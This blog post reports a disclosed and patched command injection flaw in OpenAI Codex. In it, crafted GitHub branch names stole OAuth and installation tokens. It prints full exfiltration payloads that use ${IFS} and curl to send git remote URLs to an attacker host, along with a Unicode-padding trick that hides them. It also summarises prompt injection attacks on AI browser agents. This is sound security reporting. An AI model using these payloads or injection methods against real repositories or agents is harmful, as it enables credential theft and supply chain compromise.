---
title: "OpenAI Codex: How a Branch Name Stole GitHub Tokens"
description: "BeyondTrust Phantom Labs disclosed a critical command injection vulnerability in OpenAI Codex that allowed attackers to steal GitHub OAuth tokens through unsanitized branch names. The flaw affected ChatGPT, Codex CLI, SDK, and IDE extensions, and could scale into automated supply chain attacks via poisoned GitHub branches."
slug: openai-codex-command-injection-github-token
authors: [dhaya]
tags: [openai, codex, github, command-injection, ai-security, vulnerability]
image: ./openai-codex-github-token-cover.png
---

BeyondTrust Phantom Labs [disclosed](https://www.beyondtrust.com/blog/entry/openai-codex-command-injection-vulnerability-github-token) a critical command injection vulnerability in OpenAI's Codex cloud environment on March 30, 2026. The vulnerability allowed attackers to steal GitHub OAuth tokens by injecting shell commands through a branch name parameter. A branch name. That is where the entire attack starts.

The flaw affected every Codex surface: the ChatGPT website, Codex CLI, Codex SDK, and the Codex IDE Extension. OpenAI classified it as **Critical (Priority 1)** and remediated all issues by February 5, 2026, following responsible disclosure that began December 16, 2025. No CVE has been assigned.

<!-- truncate -->

## How an unsanitized branch name became arbitrary code execution

OpenAI Codex is a cloud-based coding agent accessible through ChatGPT. Developers connect a GitHub repository, submit a prompt, and Codex spins up a managed container to execute the task. The container clones the repository during setup using a GitHub OAuth token embedded in the git remote URL. That token is live and has network access during the setup phase. It gets removed before the agent phase begins, but during setup, it is there.

The **ChatGPT Codex Connector** GitHub application requests read and write access to repositories, workflows, actions, issues, and pull requests. When authorized within a GitHub organization, it gains access to private organizational resources. That scope becomes important later.

When a user submits a task, Codex sends an HTTP POST request to `https://chatgpt.com/backend-api/wham/tasks` containing the environment identifier, the branch name, and the prompt text. On the backend, that branch name is passed directly into shell commands during container initialization, most critically a `git fetch` operation, without sanitization or quoting.

Shell metacharacters like `;`, `&&`, `|`, `$()`, and backticks in the branch name are interpreted literally by Bash. That is a command injection.

BeyondTrust researcher Tyler Jespersen confirmed the injection by passing `"-1"` as the branch name. The container raised an error in the Codex environment logs, proving the input flowed unsanitized into the execution context.

From there, crafting a payload to exfiltrate the GitHub OAuth token was straightforward:

1. Set the branch to `main`
2. Append a semicolon to terminate the git command
3. Inject a second command that writes the output of `git remote get-url origin` (which contains the cleartext OAuth token) to a file
4. Ask the Codex agent via the prompt to read and return that file's contents

The task output in the Codex web portal returned the **cleartext GitHub OAuth token**. That is the whole attack. A semicolon and a backtick subshell.

An attacker could then use this token to authenticate to GitHub as the victim, with whatever repository permissions that user holds. As Kinnaird McQuade, Chief Security Architect at BeyondTrust, [stated](https://thehackernews.com/2026/03/openai-patches-chatgpt-data.html): **"This granted lateral movement and read/write access to a victim's entire codebase."**

## The `${IFS}` bypass: getting shell commands past GitHub's branch naming rules

GitHub blocks literal spaces in branch names. That would normally prevent multi-word shell commands from appearing in a branch ref. But Bash has `${IFS}`.

`${IFS}` is the Internal Field Separator variable. In Bash, it defaults to a space, tab, and newline. When used inside a command string, `${IFS}` evaluates to a space at runtime. GitHub's branch naming validation does not block `${IFS}` because it is not a space character in the string. It is a valid sequence of alphanumeric characters, curly braces, and a dollar sign.

So every space in the payload gets replaced with `${IFS}`, producing branch names that pass GitHub's validation but execute as full shell commands inside Codex's container. GitHub sees a valid branch name. Bash sees a command.

## Automated token exfiltration through GitHub's API

The automated variant required no interaction with the Codex UI at all. An attacker with write access to a repository creates a malicious branch via the GitHub API endpoint `https://api.github.com/repos/myorg/myrepo/git/refs` with the following ref payload:

```
refs/heads/main;curl${IFS}'ec2-51-388-32-123.compute-1.amazonaws.com/'`git${IFS}-C${IFS}/workspace/TylersTestRepo${IFS}remote${IFS}get-url${IFS}origin`;
```

This payload:

- Terminates the intended git command with a semicolon
- Executes `curl` to send a request to an attacker-controlled AWS EC2 instance
- Uses a backtick subshell to extract the git remote URL (containing the embedded OAuth token) via `git remote get-url origin`
- Replaces every space with `${IFS}` to bypass GitHub's branch naming restrictions

Any Codex user who runs a task against that branch has their GitHub token silently forwarded to the attacker's server. The victim does nothing wrong. They use Codex exactly as intended.

BeyondTrust confirmed the full chain by setting up a simple HTTP server on EC2 and observing the exfiltrated token arrive in the access logs.

## Unicode obfuscation made the payload invisible in the UI

Staff Security Researcher Simon Stewart contributed a stealth technique that made the attack nearly undetectable. By appending **94 Ideographic Space characters (Unicode U+3000)** after the word "main" in the branch name, followed by `|| true` to suppress errors from the Unicode characters, the malicious payload gets pushed far beyond the visible portion of the branch selector in the Codex web portal.

The UI displays only "main." The injected commands are completely hidden.

The obfuscated payload:

```
refs/heads/main[94x U+3000]|| true;curl${IFS}'ec2-51-388-32-372.compute-1.amazonaws.com/'`git${IFS}-C${IFS}/workspace/TylersTestRepo${IFS}remote${IFS}get-url${IFS}origin`;
```

An attacker with repository admin access can set this obfuscated branch as the repository's **default branch**. Every developer who opens the repository in Codex will target the malicious branch by default. A single branch creation becomes a persistent trap that fires on every Codex interaction with the repository.

## The @codex code review path stole Installation Access tokens

The attack surface extended beyond interactive tasks. BeyondTrust discovered that referencing `@codex` in a GitHub pull request comment triggered a code review container that cloned the repository at the malicious branch and executed the injected payload. This path exfiltrated **GitHub Installation Access tokens** rather than user OAuth tokens.

Installation tokens can carry organizational permissions. They are a distinct and potentially more dangerous credential class than individual user tokens, depending on how the GitHub App is configured.

The attack required zero direct interaction with Codex. An attacker creates a malicious branch, opens a pull request, and waits for any collaborator to tag `@codex` for review. The payload executes automatically.

## Codex CLI credentials stored in plaintext

BeyondTrust also found that the Codex CLI, SDK, and IDE extension store credentials in a plaintext `auth.json` file at `~/.codex/auth.json` on macOS/Linux and `%USERPROFILE%\.codex\auth.json` on Windows. The file contains OpenAI API keys, access tokens, refresh tokens, and account identifiers. The CLI prefers the OS keyring but falls back to plaintext when the keyring is unavailable. With a compromised access token from this file, the researchers replicated the entire web portal attack through the backend API, retrieving task history and exfiltrated GitHub tokens via `https://chatgpt.com/backend-api/codex/tasks`.

## Disclosure timeline

| Date | Event |
|---|---|
| December 16, 2025 | Disclosure sent to OpenAI through BugCrowd |
| December 22, 2025 | OpenAI confirmed investigation |
| December 23, 2025 | OpenAI deployed initial hotfix for command injection |
| January 22, 2026 | Branch shell escape fix deployed |
| January 30, 2026 | Additional shell escape hardening and token access limits |
| February 5, 2026 | OpenAI classified as Critical (Priority 1). Permission granted for public disclosure |
| March 30, 2026 | BeyondTrust published public disclosure |

OpenAI's remediation addressed four areas: improved input validation for branch names before shell use, stronger shell escaping with proper variable quoting, tighter controls around token exposure within container environments, and reduced token scope and lifetime during task execution. All fixes are server-side and required no user action.

No CVE has been assigned. This is consistent with standard practice for SaaS/web application vulnerabilities that are server-side remediated.

## March 2026 exposed a pattern across AI coding agents

This was not an isolated finding. March 2026 saw critical vulnerabilities disclosed across multiple AI coding platforms:

**ShadowPrompt** (March 26, [Koi Security](https://www.koi.ai/blog/shadowprompt-how-any-website-could-have-hijacked-anthropic-claude-chrome-extension)): A zero-click prompt injection chain in Anthropic's Claude Chrome extension. A DOM-based XSS in an Arkose Labs CAPTCHA component on `a-cdn.claude.ai`, combined with the extension's overly permissive `*.claude.ai` origin allowlist, allowed any website to silently inject prompts. The attack could steal Gmail tokens, read Google Drive files, and send emails as the victim. Anthropic patched in extension v1.0.41.

**PleaseFix** (March 3, [Zenity Labs](https://www.helpnetsecurity.com/2026/03/04/agentic-browser-vulnerability-perplexedbrowser/)): Zero-click file exfiltration and 1Password credential theft through Perplexity's Comet browser. A Google Calendar invite with hidden prompt injection caused the AI agent to browse local files via `file://` and exfiltrate them. Zenity CTO Michael Bargury called it "not a bug" but "an inherent vulnerability in agentic systems."

**Cursor** accumulated [24+ CVEs](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html) across multiple disclosure waves, including CVE-2026-22708 (CVSS 9.8, shell bypass in Auto-Run Mode) and CVE-2026-26268 (git hook escape). OX Security found that both Cursor and Windsurf run on outdated Chromium builds with 94+ known unpatched CVEs.

The pattern is consistent. Every major AI coding platform required expansive permissions to be useful. Every permission became an attack surface when the AI agent processed untrusted input. Branch names, commit messages, PR titles, calendar invites, configuration files, and CAPTCHA components all served as injection vectors. The [Promptware Kill Chain](https://blog.trvth.org/2026/03/promptware-kill-chain.html) paper (Brodt, Feldman, Schneier, Nassi, February 2026) recast prompt injection as the initial access stage of a seven-stage malware kill chain, documenting 21 attacks that traverse four or more stages.

## So what changed?

This specific vulnerability is patched. The fix list is the same one that has been written a thousand times: sanitize input, scope tokens, escape shell metacharacters, validate external data before it touches a command line. The fact that a company with OpenAI's resources shipped unsanitized string interpolation into a Bash command in 2025 says more about the state of AI agent security than any remediation checklist.

The deeper issue is architectural. AI coding agents need broad permissions to be useful. Those permissions become attack surface the moment the agent processes anything it did not generate itself. Branch names, PR titles, commit messages, config files. All of it is untrusted input, and all of it is being fed into execution environments with live credentials.

That tension is not going away with a patch.

---

*If you are running GPU workloads and want infrastructure where you control the security boundary, [barrack.ai](https://barrack.ai) provides on-demand GPU cloud access with per-minute billing, zero egress fees, and no contracts.*

---

## FAQ

**Q: Is this vulnerability still active?**
No. OpenAI deployed a complete fix by February 5, 2026. All remediation is server-side. No user action is required.

**Q: Was a CVE assigned?**
No. This is consistent with standard practice for SaaS vulnerabilities that are remediated server-side before public disclosure.

**Q: Which Codex products were affected?**
The ChatGPT website, Codex CLI, Codex SDK, and the Codex IDE Extension were all affected.

**Q: Could this have been exploited without interacting with Codex directly?**
Yes. The automated variant involved creating a malicious branch via GitHub's API. Any Codex user who ran a task against that branch had their token exfiltrated without any additional interaction.

**Q: What permissions did the stolen GitHub token have?**
The ChatGPT Codex Connector requests read and write access to repositories, workflows, actions, issues, and pull requests. A stolen token inherits all repository permissions the victim user holds.

**Q: How did the Unicode obfuscation work?**
94 Ideographic Space characters (Unicode U+3000) were appended after the word "main" in the branch name. These characters pushed the malicious payload beyond the visible area of the branch selector in the Codex UI, making the branch appear as just "main."

**Q: What is `${IFS}` and why did it bypass GitHub's restrictions?**
`${IFS}` is Bash's Internal Field Separator variable, which defaults to a space. GitHub blocks literal spaces in branch names but does not block `${IFS}`, because it appears as a valid sequence of alphanumeric characters and symbols. At shell runtime, it evaluates to a space, allowing multi-word commands to execute.

**Q: Was the @codex code review path also patched?**
Yes. OpenAI's remediation covered all attack paths, including the code review container that executed when `@codex` was referenced in a GitHub PR comment.

**Q: Did the attacker need admin access to the repository?**
For the basic attack, write access to create a branch was sufficient. Setting the malicious branch as the default branch required admin access.

**Q: How were Codex CLI credentials stored?**
In an `auth.json` file at `~/.codex/auth.json` (macOS/Linux) or `%USERPROFILE%\.codex\auth.json` (Windows). The file contains OpenAI API keys, access tokens, refresh tokens, and account identifiers. The CLI prefers the OS keyring but falls back to plaintext storage when unavailable.

---

**Sources:** [BeyondTrust Phantom Labs](https://www.beyondtrust.com/blog/entry/openai-codex-command-injection-vulnerability-github-token) · [The Hacker News](https://thehackernews.com/2026/03/openai-patches-chatgpt-data.html) · [SiliconANGLE](https://siliconangle.com/2026/03/30/openai-codex-vulnerability-enabled-github-token-theft-via-command-injection-report-finds/) · [TechNadu](https://www.technadu.com/openai-codex-vulnerability-exposes-github-credentials-via-command-injection/624863/) · [OpenAI Codex Docs](https://developers.openai.com/codex/cloud/environments)
